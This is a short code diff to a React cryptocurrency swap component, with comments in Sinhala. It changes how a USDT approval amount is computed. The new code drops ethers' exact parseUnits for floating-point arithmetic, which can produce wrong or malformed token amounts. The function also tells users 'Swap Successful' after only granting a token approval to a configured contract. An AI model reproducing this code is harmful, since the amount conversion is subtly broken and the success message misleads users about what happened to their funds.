@@ -88,7 +88,6 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ මේක තමයි අලුත් ෆන්ක්ෂන් එක. 
   const executeSwap = async () => {
     if (!walletAddress) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
     if (!fromAmount || fromAmount <= 0) { setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); return; }
@@ -101,10 +100,10 @@ export default function SwapCard({ walletAddress, provider }) {
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       const decimals = await usdtContract.decimals();
       
-      // ethers.utils.parseUnits පාවිච්චි කරමු (BigNumber නැතුව)
-      const amountWei = ethers.utils.parseUnits(fromAmount, decimals);
+      // String එකක් විදිහට ගණනය කරමු (parseUnits නැතුව)
+      const amountStr = Math.floor(parseFloat(fromAmount) * 10 ** decimals).toString();
 
-      const tx = await usdtContract.approve(CONFIG.contractAddress, amountWei);
+      const tx = await usdtContract.approve(CONFIG.contractAddress, amountStr);
       setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting...' });
       await tx.wait();
       setStatus({ type: 'success', msg: '✅ Swap Successful! Tokens approved.' });
